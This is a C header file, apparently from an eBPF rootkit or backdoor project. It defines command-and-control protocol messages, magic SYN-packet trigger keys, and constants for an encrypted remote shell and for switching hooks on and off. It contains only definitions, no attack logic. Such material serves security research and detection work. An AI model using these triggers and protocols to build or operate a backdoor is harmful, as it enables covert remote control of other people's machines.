#ifndef __BPF_CC_H
#define __BPF_CC_H

//C&C V0 & V1 --> Unencrypted transmission with RAW sockets, no TCP conn
//Protocol messages are also used in the secure channel of V2 & V3 backdoor
#define CC_PROT_SYN "CC_SYN"
#define CC_PROT_ACK "CC_ACK"
#define CC_PROT_MSG "CC_MSG#"
#define CC_PROT_FIN_PART "CC_FIN"
#define CC_PROT_ERR "CC_ERR"
#define CC_PROT_FIN CC_PROT_MSG CC_PROT_FIN_PART
#define CC_PROT_BASH_COMMAND_REQUEST "CC_COMM_RQ#"
#define CC_PROT_BASH_COMMAND_RESPONSE "CC_COMM_RS#"

//C&C V1 & V2 --> bpv47-like trigger + encrypted shell in V2
#define CC_TRIGGER_SYN_PACKET_PAYLOAD_SIZE 0x10
#define CC_TRIGGER_SYN_PACKET_KEY_1 "\x56\xA4"
#define CC_TRIGGER_SYN_PACKET_KEY_2 "\x78\x13"
#define CC_TRIGGER_SYN_PACKET_KEY_3_ENCRYPTED_SHELL "\x1F\x29"
#define CC_TRIGGER_SYN_PACKET_KEY_3_HOOK_ACTIVATE_ALL "\x1D\x25"
#define CC_TRIGGER_SYN_PACKET_KEY_3_HOOK_DEACTIVATE_ALL "\x1D\x24"
#define CC_TRIGGER_SYN_PACKET_SECTION_LEN 0x02

#define CC_PROT_COMMAND_ENCRYPTED_SHELL 0
#define CC_PROT_COMMAND_HOOK_ACTIVATE_ALL 1
#define CC_PROT_COMMAND_HOOK_DEACTIVATE_ALL 2

//C&C V3 -- Distributed hidden payload in packet stream
struct trigger_t {
    unsigned int seq_raw;
};
#define CC_STREAM_TRIGGER_PAYLOAD_LEN 12
#define CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES 4
#define CC_STREAM_TRIGGER_KEY_ENCRYPTED_SHELL "\x2C\x82"


#endif